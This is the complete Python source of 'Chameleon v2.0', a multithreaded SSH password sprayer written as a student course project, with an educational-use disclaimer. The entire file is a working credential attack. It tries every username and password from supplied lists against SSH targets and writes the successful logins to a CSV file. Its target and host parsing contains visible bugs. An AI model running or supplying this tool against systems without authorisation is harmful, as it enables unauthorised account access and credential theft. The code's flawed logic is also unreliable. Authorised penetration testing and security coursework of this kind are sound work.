"""
Chameleon v2.0

author: Parker J Swierzewski
language: python3

desc: Chameleon is a password sprayer that makes use of multithreading. It attempts to
        crack user login and passwords for a specific service or protocol. This tool was developed
        for my CSEC 380 Project "Is Python Faster than C: Writing a Password Sprayer in Python using
        Multithreading".

disclaimer: This tool was created for educational purposes. Only use this tool on systems
                you have ownership of or have written consent to test on and do not use this
                tool for illegal purposes! I am not responsible for any misuse of this tool.
"""
import argparse         # Used for command-line arguments.
import csv              # Used for formatting results into a CSV file.
import multiprocessing  # Used for multithreading.
import paramiko         # Connecting to SSH servers.
import os               # Used to check if the files exist.
import time             # Used to track how long the program took.

from concurrent.futures import ThreadPoolExecutor

# Checks if the given host is a valid IPv4 address. No support for IPv6 and hostnames at the moment sorry </3
from ipaddress import ip_address, IPv4Address

# Disclaimer and Usage
parser = argparse.ArgumentParser(description="Disclaimer: This tool was created for educational purposes. Only use this tool on systems " +
                                             "you have ownership of or have written consent to test on and do not use this tool for illegal " +
                                             "purposes! I am not responsible for any misuse of this tool.",
                                 epilog="Make sure you read the documentation provided on Github! It provides how to use each command-line argument "
                                        "as well as explaining what each one does in greater detail.",
                                 add_help=False)

# Required Arguments
parser._action_groups.pop()
requiredArguments = parser.add_argument_group("required arguments")
requiredArguments.add_argument('-l', dest="login", nargs='?', type=str, metavar="FILE", help="the login list.")
requiredArguments.add_argument('-p', dest="password", nargs='?', type=str, metavar="FILE", help="the password list.")
requiredArguments.add_argument("host", help="[protocol://server:port] or [protocol:port]")

# Optional Arguments
optionalArguments = parser.add_argument_group("optional arguments")
optionalArguments.add_argument('-h', "--help", action="help", default=argparse.SUPPRESS, help="show this help message and exit.")
optionalArguments.add_argument("-t", dest="targets", nargs="?", type=str, required=False, metavar="FILE", help="the target list.")
optionalArguments.add_argument("-c", dest="threads", nargs="?", type=int, required=False, metavar="INTEGER", help="amount of threads.")
optionalArguments.add_argument('-v', dest="verbose", required=False, action="store_true", help="enable verbose mode.")


args = parser.parse_args()

LOGIN = ""      # A file with a list of potential usernames.
PASSWORD = ""   # A file with a list of potential passwords.
PROTOCOL = ""   # The protocol being attacked.
SERVER = ""     # The IPv4 address range.
TARGETS = ""    # A file with a list of targets.
PORT = 22        # The port number of the server (22 by default).
THREADS = 20    # The amount of threads created (20 by default).
VERBOSE = False # Whether or not to enable verbose (True = On).

CREDENTIALS = set() # A Python set of valid credentials.

def populate():
    """
    This function will loop through the given login and password
    files given and populate the username and password sets.

    :return: Three sets (One filled with potential usernames, one filled with potential passwords, one filled with potential targets).
    """
    targets = set()
    usernames = set()
    passwords = set()

    # Populates the target set.
    if TARGETS != "" or TARGETS is not None:
        with open(TARGETS) as tfile:
            for line in tfile:
                targets.add(str(line).strip("\n"))
    else:
        start  = str(SERVER[:-1]) + "{}"
        targets.add(start.format(addr) for addr in range(int(SERVER[-1]), 255))

    # Populates the username set.
    with open(LOGIN) as flogin:
        for line in flogin:
            usernames.add(str(line).strip("\n"))

    # Populates the password set.
    with open(PASSWORD) as fpass:
        for line in fpass:
            passwords.add(str(line).strip("\n"))

    return (targets, usernames, passwords)

def passwordSprayer(targets, usernames, passwords):
    """
    This function handle the actually password spraying and
    implements multithreading.
    
    :param targets: The list of targets.
    :param usernames: The list of potentional usernames.
    :param passwords: The list of potentional passwords.
    :return: None
    """
    # Starts the timer.
    start = time.time()

    # Threading shenanigans.
    threads = []
    pool = ThreadPoolExecutor(THREADS)
    for password in passwords:
        for username in usernames:
            thread = pool.submit(connect, targets, username, password)
            threads.append(thread)

    # Make sure all threads are dead/done.
    for thread in threads:
        while not thread.done():
            pass

    # Ends the timer.
    end = time.time()
    total_time = end - start

    if VERBOSE:
        print("\n[!] It took %d seconds to obtain %d valid login credentials!\n" % (total_time, len(CREDENTIALS)))

    # Prints the results.
    if len(CREDENTIALS) == 0:
        print("[!] No valid credentials were found!")
    else:
        print("Results ([server] - username:passwords):")
        for element in CREDENTIALS:
            split = element.split(",")
            print("[%s] - %s:%s" % (split[0].strip(), split[1].strip(), split[2].strip()))

def credentialsAlreadyExist(target, username):
    """
    This function will determine if credentials were
    already found for a specific user on a specific target.

    :param target: The IP address or hostname.
    :param username: The username being searched.
    :return: Boolean Flag (True = Username already exists).
    """
    for credentials in CREDENTIALS:
        split = credentials.split(",")
        f_target = split[0].strip()
        f_username = split[1].strip()

        if f_target == target and f_username == username:
            return True
    return False

def connect(targets, username, password):
    """
    This function will attempt to connect to the server
    with the given username and password.

    :param targets: The list of targets.
    :param username: The potential username.
    :param password: The potential password.
    """
    for target in targets:
        if credentialsAlreadyExist(target, username):
            break        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, PORT, username, password, timeout=10)
                                           
            CREDENTIALS.add("%s, %s, %s" % (target, username, password))

            if VERBOSE:
                print("[!] Credentials Found! ([%s] - %s:%s)" % (target, username, password))

            client.close()
        except Exception as e:
            if VERBOSE:
                print("[!] Credentials Failed! ([%s] - %s:%s)" % (target, username, password))

if __name__ == "__main__":
    if args.login is None or args.password is None:
        parser.error("You did not specify a login list, password list, or both. Execute `python3 chameleon.py -h` for help!")

    if not os.path.isfile(args.login) or not os.path.isfile(args.password):
        parser.error("A file you specified is not a real file on the system!")

    # Assigns the parameters given to global variables.
    LOGIN = args.login
    PASSWORD = args.password
    VERBOSE = args.verbose

    TARGETS = args.targets
    if TARGETS != "" or TARGETS is not None:
        if not os.path.isfile(TARGETS):
            parser.error("The target file you specified is not a real file on the system!")
        split = str(args.host).split(":")
        PROTOCOL = split[0]
        PORT = split[1]
    else:
        split = str(args.host).split(":")
        PROTOCOL = split[0]
        SERVER = split[1].strip("/")
        PORT = split[2]

        if type(ip_address(SERVER)) is not IPv4Address:
            print("[!] `%s` is not a valid IPv4 Address! Only IPv4 addresses are supported.\n")
            exit(1)

    if PROTOCOL.lower() != "ssh":
        print("[!] The protocol you entered is not currently supported.\n")
        exit(1)

    # Will prevent users from entering strings or invalid port numbers.
    try:
        PORT = int(PORT)
        if PORT < 0 or PORT > 65535:
            raise ValueError
    except ValueError as ve:
        print("[!] {} is not a valid port number.\n".format(PORT))
        exit(1)
    
    # Assigns thread count.
    if args.threads is not None:
        THREADS = args.threads

    if THREADS < 1:
        parser.error("Thread count needs to be greater than one!")

    # Creates and populates sets with targets, usernames, and passwords.
    (targets, usernames, passwords) = populate()

    # Starts password spraying.
    passwordSprayer(targets, usernames, passwords)

    # Writes the results to a file.
    with open("results.csv", 'w') as csvFile:
        writer = csv.writer(csvFile)
        writer.writerow(["Server", "Username", "Password"])
        for element in CREDENTIALS:
            writer.writerow(element.split(","))

    print("\n[!] The results have been converted to a CSV file at %s" % os.getcwd())

    # End of program.
    print("\nThe program has concluded.")
